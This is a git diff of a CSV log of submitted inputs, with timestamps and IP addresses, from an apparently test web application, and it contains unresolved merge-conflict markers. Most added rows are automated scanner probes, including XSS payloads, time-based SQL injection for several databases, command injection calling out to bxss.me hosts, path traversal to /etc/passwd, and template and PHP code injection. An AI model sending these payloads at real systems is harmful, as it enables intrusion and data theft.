@@ -47,9 +47,171 @@ hello,Tue Sep 15 02:44:45 2020,127.0.0.1
 walala,Wed Sep 16 19:37:44 2020,127.0.0.1
 123,Fri Sep 18 10:48:36 2020,111.199.189.249
 123,Fri Sep 18 10:54:46 2020,111.199.189.249
+<<<<<<< Updated upstream
 =======
 what,Mon Oct 26 18:11:01 2020,127.0.0.1
 >>>>>>> Stashed changes
 =======
 what,Mon Oct 26 18:11:01 2020,127.0.0.1
+>>>>>>> Stashed changes
+=======
+[wqe],Mon Sep 28 02:43:34 2020,127.0.0.1
+hao,Mon Sep 28 19:21:43 2020,123.145.180.153
+onerror=prompt(/xss/)>,Mon Sep 28 19:22:57 2020,123.145.180.153
+onerror=prompt(/xss/)>,Mon Sep 28 19:23:06 2020,123.145.180.153
+h,Mon Sep 28 19:25:28 2020,123.145.180.153
+onerror=prompt(/xss/),Mon Sep 28 19:25:42 2020,123.145.180.153
+onerror=alert,Mon Sep 28 19:26:22 2020,123.145.180.153
+aaaa,Tue Sep 29 00:33:39 2020,127.0.0.1
+sb,Tue Sep 29 08:21:40 2020,127.0.0.1
+aa,Tue Sep 29 08:23:27 2020,127.0.0.1
+aa,Tue Sep 29 08:23:27 2020,127.0.0.1
+11,Tue Sep 29 08:23:39 2020,127.0.0.1
+aa,Tue Sep 29 08:23:44 2020,127.0.0.1
+xx,Tue Sep 29 08:23:46 2020,127.0.0.1
+xxaaaaaaaaaaa,Tue Sep 29 08:23:48 2020,127.0.0.1
+Crawlergo,Sat Oct  3 00:00:37 2020,127.0.0.1
+Crawlergo,Sat Oct  3 00:00:50 2020,127.0.0.1
+Crawlergo,Sat Oct  3 00:01:06 2020,127.0.0.1
+Crawlergo,Sat Oct  3 00:01:10 2020,127.0.0.1
+e,Sat Oct  3 17:27:55 2020,127.0.0.1
+"1'""",Sat Oct  3 17:29:08 2020,127.0.0.1
+\,Sat Oct  3 17:29:09 2020,127.0.0.1
+@@IxIMc,Sat Oct  3 17:29:09 2020,127.0.0.1
+JyI=,Sat Oct  3 17:29:09 2020,127.0.0.1
+e,Sat Oct  3 17:29:12 2020,127.0.0.1
+e,Sat Oct  3 17:29:12 2020,127.0.0.1
+e&n950130=v901218,Sat Oct  3 17:29:14 2020,127.0.0.1
+HttP://bxss.me/t/xss.html?%00,Sat Oct  3 17:29:14 2020,127.0.0.1
+bxss.me/t/xss.html?%00,Sat Oct  3 17:29:14 2020,127.0.0.1
+e,Sat Oct  3 17:29:14 2020,127.0.0.1
+e,Sat Oct  3 17:29:14 2020,127.0.0.1
+e,Sat Oct  3 17:29:15 2020,127.0.0.1
+e,Sat Oct  3 17:29:15 2020,127.0.0.1
+G5vqsMc5,Sat Oct  3 17:29:15 2020,127.0.0.1
+-1 OR 2+455-455-1=0+0+0+1 -- ,Sat Oct  3 17:29:15 2020,127.0.0.1
+-1 OR 2+592-592-1=0+0+0+1,Sat Oct  3 17:29:15 2020,127.0.0.1
+-1' OR 2+842-842-1=0+0+0+1 -- ,Sat Oct  3 17:29:15 2020,127.0.0.1
+-1' OR 2+652-652-1=0+0+0+1 or 'jdg2pKxV'=',Sat Oct  3 17:29:15 2020,127.0.0.1
+"-1"" OR 2+567-567-1=0+0+0+1 -- ",Sat Oct  3 17:29:15 2020,127.0.0.1
+JQKxqZcm,Sat Oct  3 17:29:15 2020,127.0.0.1
+768',Sat Oct  3 17:29:15 2020,127.0.0.1
+"if(now()=sysdate(),sleep(12),0)",Sat Oct  3 17:29:15 2020,127.0.0.1
+"0'XOR(if(now()=sysdate(),sleep(12),0))XOR'Z",Sat Oct  3 17:29:15 2020,127.0.0.1
+e,Sat Oct  3 17:29:15 2020,127.0.0.1
+"0""XOR(if(now()=sysdate(),sleep(12),0))XOR""Z",Sat Oct  3 17:29:15 2020,127.0.0.1
+"echo iitiqc$()\ tsohje\nz^xyu||a #' &echo iitiqc$()\ tsohje\nz^xyu||a #|"" &echo iitiqc$()\ tsohje\nz^xyu||a #",Sat Oct  3 17:29:15 2020,127.0.0.1
+"(select(0)from(select(sleep(12)))v)/*'+(select(0)from(select(sleep(12)))v)+'""+(select(0)from(select(sleep(12)))v)+""*/",Sat Oct  3 17:29:15 2020,127.0.0.1
+"&echo kplrsz$()\ sbogtl\nz^xyu||a #' &echo kplrsz$()\ sbogtl\nz^xyu||a #|"" &echo kplrsz$()\ sbogtl\nz^xyu||a #",Sat Oct  3 17:29:15 2020,127.0.0.1
+1 waitfor delay '0:0:12' -- ,Sat Oct  3 17:29:15 2020,127.0.0.1
+../../../../../../../../../../etc/passwd,Sat Oct  3 17:29:15 2020,127.0.0.1
+"|echo pajbui$()\ jenbzr\nz^xyu||a #' |echo pajbui$()\ jenbzr\nz^xyu||a #|"" |echo pajbui$()\ jenbzr\nz^xyu||a #",Sat Oct  3 17:29:15 2020,127.0.0.1
+k1urjFm8'; waitfor delay '0:0:12' -- ,Sat Oct  3 17:29:15 2020,127.0.0.1
+../../../../../../../../../../windows/win.ini,Sat Oct  3 17:29:15 2020,127.0.0.1
+"(nslookup hitkogxulkdrs03047.bxss.me||perl -e ""gethostbyname('hitkogxulkdrs03047.bxss.me')"")",Sat Oct  3 17:29:16 2020,127.0.0.1
+Xa9S3YHz' OR 464=(SELECT 464 FROM PG_SLEEP(12))--,Sat Oct  3 17:29:16 2020,127.0.0.1
+e,Sat Oct  3 17:29:16 2020,127.0.0.1
+../e,Sat Oct  3 17:29:16 2020,127.0.0.1
+"$(nslookup hitiqeobkihwjc9c15.bxss.me||perl -e ""gethostbyname('hitiqeobkihwjc9c15.bxss.me')"")",Sat Oct  3 17:29:16 2020,127.0.0.1
+0G9Xf9QQ') OR 932=(SELECT 932 FROM PG_SLEEP(12))--,Sat Oct  3 17:29:16 2020,127.0.0.1
+"&(nslookup hittrwhwpswuw3e021.bxss.me||perl -e ""gethostbyname('hittrwhwpswuw3e021.bxss.me')"")&'\""`0&(nslookup hittrwhwpswuw3e021.bxss.me||perl -e ""gethostbyname('hittrwhwpswuw3e021.bxss.me')"")&`'",Sat Oct  3 17:29:16 2020,127.0.0.1
+4PGRG4x1')) OR 151=(SELECT 151 FROM PG_SLEEP(12))--,Sat Oct  3 17:29:16 2020,127.0.0.1
+"e'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),12)||'",Sat Oct  3 17:29:16 2020,127.0.0.1
+"|(nslookup hithtlmkueuct535f1.bxss.me||perl -e ""gethostbyname('hithtlmkueuct535f1.bxss.me')"")",Sat Oct  3 17:29:16 2020,127.0.0.1
+"`(nslookup hitwjihwjrayb34b36.bxss.me||perl -e ""gethostbyname('hitwjihwjrayb34b36.bxss.me')"")`",Sat Oct  3 17:29:16 2020,127.0.0.1
+"e<esi:include src=""http://bxss.me/rpb.png""/>",Sat Oct  3 17:29:16 2020,127.0.0.1
+";(nslookup hitxsjogtwtgz19b27.bxss.me||perl -e ""gethostbyname('hitxsjogtwtgz19b27.bxss.me')"")|(nslookup hitxsjogtwtgz19b27.bxss.me||perl -e ""gethostbyname('hitxsjogtwtgz19b27.bxss.me')"")&(nslookup hitxsjogtwtgz19b27.bxss.me||perl -e ""gethostbyname('hitxsjogtwtgz19b27.bxss.me')"")",Sat Oct  3 17:29:16 2020,127.0.0.1
+response.write(9447923*9387151),Sat Oct  3 17:29:16 2020,127.0.0.1
+${9999289+10000228},Sat Oct  3 17:29:16 2020,127.0.0.1
+'+response.write(9447923*9387151)+',Sat Oct  3 17:29:16 2020,127.0.0.1
+"""+response.write(9447923*9387151)+""",Sat Oct  3 17:29:16 2020,127.0.0.1
+http://some-inexistent-website.acu/some_inexistent_file_with_long_name%3F.jpg,Sat Oct  3 17:29:17 2020,127.0.0.1
+1some_inexistent_file_with_long_name%00.jpg,Sat Oct  3 17:29:17 2020,127.0.0.1
+),Sat Oct  3 17:29:17 2020,127.0.0.1
+Http://bxss.me/t/fit.txt,Sat Oct  3 17:29:17 2020,127.0.0.1
+!(()&&!|*|*|,Sat Oct  3 17:29:17 2020,127.0.0.1
+http://bxss.me/t/fit.txt%3F.jpg,Sat Oct  3 17:29:17 2020,127.0.0.1
+;print(md5(31337));,Sat Oct  3 17:29:17 2020,127.0.0.1
+^(#$!@#$)(()))******,Sat Oct  3 17:29:17 2020,127.0.0.1
+';print(md5(31337));$a=',Sat Oct  3 17:29:17 2020,127.0.0.1
+bxss.me,Sat Oct  3 17:29:17 2020,127.0.0.1
+""";print(md5(31337));$a=""",Sat Oct  3 17:29:17 2020,127.0.0.1
+${@print(md5(31337))},Sat Oct  3 17:29:18 2020,127.0.0.1
+${@print(md5(31337))}\,Sat Oct  3 17:29:18 2020,127.0.0.1
+'.print(md5(31337)).',Sat Oct  3 17:29:18 2020,127.0.0.1
+"e'""()&%<acx><ScRiPt >dtL8(9458)</ScRiPt>",Sat Oct  3 17:29:18 2020,127.0.0.1
+))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))),Sat Oct  3 17:29:18 2020,127.0.0.1
+"'""()&%<acx><ScRiPt >dtL8(9799)</ScRiPt>",Sat Oct  3 17:29:18 2020,127.0.0.1
+e9541624,Sat Oct  3 17:29:19 2020,127.0.0.1
+/xfs.bxss.me,Sat Oct  3 17:29:19 2020,127.0.0.1
+"'""",Sat Oct  3 17:29:19 2020,127.0.0.1
+<!--,Sat Oct  3 17:29:19 2020,127.0.0.1
+'.gethostbyname(lc('hitev'.'fzuhhitpe09d3.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(104).chr(80).chr(97).chr(69).',Sat Oct  3 17:29:20 2020,127.0.0.1
+""".gethostbyname(lc(""hitgl"".""unznpurqae4bb.bxss.me."")).""A"".chr(67).chr(hex(""58"")).chr(97).chr(73).chr(119).chr(81).""",Sat Oct  3 17:29:21 2020,127.0.0.1
+Crawlergo,Mon Oct  5 07:11:54 2020,127.0.0.1
+Crawlergo,Mon Oct  5 07:12:02 2020,127.0.0.1
+Crawlergo,Mon Oct  5 07:12:24 2020,127.0.0.1
+Crawlergo,Mon Oct  5 07:12:27 2020,127.0.0.1
+Cr,Mon Oct  5 18:56:04 2020,127.0.0.1
+Cr,Mon Oct  5 18:56:10 2020,127.0.0.1
+Cr,Mon Oct  5 18:57:05 2020,127.0.0.1
+Craw,Mon Oct  5 20:37:24 2020,127.0.0.1
+Craw,Mon Oct  5 20:37:38 2020,127.0.0.1
+Craw,Mon Oct  5 20:38:23 2020,127.0.0.1
+"Craw
+expr 896133936 + 870080010
+",Mon Oct  5 21:50:01 2020,127.0.0.1
+pweihjofifqqoywbwobt,Mon Oct  5 21:50:02 2020,127.0.0.1
+Craw|expr 997085131 + 875270627 ,Mon Oct  5 21:50:02 2020,127.0.0.1
+Craw$(expr 803932803 + 858456875),Mon Oct  5 21:50:02 2020,127.0.0.1
+Craw,Mon Oct  5 21:50:02 2020,127.0.0.1
+Craw&set /A 972961668+826069204,Mon Oct  5 21:50:02 2020,127.0.0.1
+${@var_dump(md5(673033574))};,Mon Oct  5 21:50:02 2020,127.0.0.1
+'-var_dump(md5(949322437))-',Mon Oct  5 21:50:02 2020,127.0.0.1
+/*1*/{{921748082+920864120}},Mon Oct  5 21:50:02 2020,127.0.0.1
+${994031262+940526790},Mon Oct  5 21:50:02 2020,127.0.0.1
+${(898976783+859400088)?c},Mon Oct  5 21:50:02 2020,127.0.0.1
+#set($c=830912087+886765824)${c}$c,Mon Oct  5 21:50:04 2020,127.0.0.1
+<%- 898185489+875984296 %>,Mon Oct  5 21:50:22 2020,127.0.0.1
+<%- 898185489+875984296 %>,Mon Oct  5 21:50:22 2020,127.0.0.1
+Craw,Mon Oct  5 21:53:50 2020,127.0.0.1
+Craw,Mon Oct  5 21:53:50 2020,127.0.0.1
+Craw,Mon Oct  5 21:53:50 2020,127.0.0.1
+"Craw'and/**/extractvalue(1,concat(char(126),md5(1713511984)))and'",Mon Oct  5 21:53:50 2020,127.0.0.1
+"Craw""and/**/extractvalue(1,concat(char(126),md5(1655795261)))and""",Mon Oct  5 21:53:50 2020,127.0.0.1
+"extractvalue(1,concat(char(126),md5(1757348937)))",Mon Oct  5 21:53:50 2020,127.0.0.1
+Craw'and(select'1'from/**/cast(md5(1773662644)as/**/int))>'0,Mon Oct  5 21:53:50 2020,127.0.0.1
+Craw/**/and/**/cast(md5('1096116613')as/**/int)>0,Mon Oct  5 21:53:50 2020,127.0.0.1
+"convert(int,sys.fn_sqlvarbasetostr(HashBytes('MD5','1566125065')))",Mon Oct  5 21:53:50 2020,127.0.0.1
+"Craw'and/**/convert(int,sys.fn_sqlvarbasetostr(HashBytes('MD5','1932801559')))>'0",Mon Oct  5 21:53:50 2020,127.0.0.1
+"Craw'""\(",Mon Oct  5 21:53:50 2020,127.0.0.1
+Craw'and'a'='a,Mon Oct  5 21:53:50 2020,127.0.0.1
+Craw'and'l'='p,Mon Oct  5 21:53:50 2020,127.0.0.1
+"Craw""and""f""=""f",Mon Oct  5 21:53:50 2020,127.0.0.1
+"Craw""and""x""=""d",Mon Oct  5 21:53:51 2020,127.0.0.1
+Craw,Mon Oct  5 21:53:51 2020,127.0.0.1
+Craw,Mon Oct  5 21:53:51 2020,127.0.0.1
+Craw,Mon Oct  5 21:53:51 2020,127.0.0.1
+Craw'and(select*from(select+sleep(0))a/**/union/**/select+1)=',Mon Oct  5 21:53:51 2020,127.0.0.1
+Craw'and(select*from(select+sleep(2))a/**/union/**/select+1)=',Mon Oct  5 21:53:51 2020,127.0.0.1
+"Craw""and(select*from(select+sleep(0))a/**/union/**/select+1)=""",Mon Oct  5 21:53:51 2020,127.0.0.1
+"Craw""and(select*from(select+sleep(2))a/**/union/**/select+1)=""",Mon Oct  5 21:53:51 2020,127.0.0.1
+Craw'/**/and(select'1'from/**/pg_sleep(0))>'0,Mon Oct  5 21:53:51 2020,127.0.0.1
+Craw'/**/and(select'1'from/**/pg_sleep(2))>'0,Mon Oct  5 21:53:51 2020,127.0.0.1
+Craw'and(select+1)>0waitfor/**/delay'0:0:0,Mon Oct  5 21:53:52 2020,127.0.0.1
+Craw'and(select+1)>0waitfor/**/delay'0:0:2,Mon Oct  5 21:53:52 2020,127.0.0.1
+"Craw'/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE('z',0)='z",Mon Oct  5 21:53:52 2020,127.0.0.1
+"Craw'/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE('a',2)='a",Mon Oct  5 21:53:52 2020,127.0.0.1
+aaa,Sat Oct 10 20:36:45 2020,127.0.0.1
+<aaa,Sat Oct 10 20:37:03 2020,127.0.0.1
+<details>,Sat Oct 10 20:37:11 2020,127.0.0.1
+<details/open/ontoggle=alert(1)>,Sat Oct 10 20:37:59 2020,127.0.0.1
+<details/open/ontoggle=alert(1)>,Sat Oct 10 20:38:21 2020,127.0.0.1
+<details/open/ontoggle=alert(1)>,Sat Oct 10 20:38:22 2020,127.0.0.1
+onmouseover,Tue Oct 13 06:38:50 2020,127.0.0.1
+ddd,Tue Oct 13 06:38:55 2020,127.0.0.1
+erfg,Thu Oct 15 23:39:07 2020,127.0.0.1
+ ,Thu Nov  5 05:43:55 2020,127.0.0.1
+    ,Thu Nov  5 05:44:00 2020,127.0.0.1
+ibVIoXhB,Fri Nov 13 06:58:12 2020,127.0.0.1
 >>>>>>> Stashed changes
